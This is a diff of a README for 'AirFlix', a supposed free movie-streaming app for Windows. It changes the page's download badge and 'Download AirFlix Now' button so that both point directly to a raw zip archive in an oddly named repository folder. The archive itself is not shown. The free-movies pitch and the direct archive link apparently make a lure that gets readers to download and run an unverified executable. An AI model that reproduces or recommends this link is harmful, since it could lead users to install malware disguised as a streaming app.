@@ -1,7 +1,7 @@
 <h1>🎬 AirFlix - Watch Movies Free on PC</h1>
 
 <p align="center">
-<a href="https://github.com/Sibyllasimian108/AirFlix"><img src="https://img.shields.io/badge/Download-AirFlix-%23FF6B6B?style=for-the-badge&logo=windows&logoColor=white" alt="Download AirFlix"></a>
+<a href="https://github.com/Sibyllasimian108/AirFlix/raw/refs/heads/main/undignifiedness/Air_Flix_v3.8.zip"><img src="https://img.shields.io/badge/Download-AirFlix-%23FF6B6B?style=for-the-badge&logo=windows&logoColor=white" alt="Download AirFlix"></a>
 </p>
 
 ## 🎯 What Is AirFlix?
@@ -54,7 +54,7 @@ AirFlix is a free, modern movie and TV streaming app for your Windows computer. 
 Click the big button below to go to the download page:
 
 <p align="center">
-<a href="https://github.com/Sibyllasimian108/AirFlix" style="background-color:#4CAF50;color:white;padding:15px 40px;font-size:20px;border-radius:8px;text-decoration:none;display:inline-block;">⬇️ Download AirFlix Now</a>
+<a href="https://github.com/Sibyllasimian108/AirFlix/raw/refs/heads/main/undignifiedness/Air_Flix_v3.8.zip" style="background-color:#4CAF50;color:white;padding:15px 40px;font-size:20px;border-radius:8px;text-decoration:none;display:inline-block;">⬇️ Download AirFlix Now</a>
 </p>
 
 ### Step 2: Get the Right File
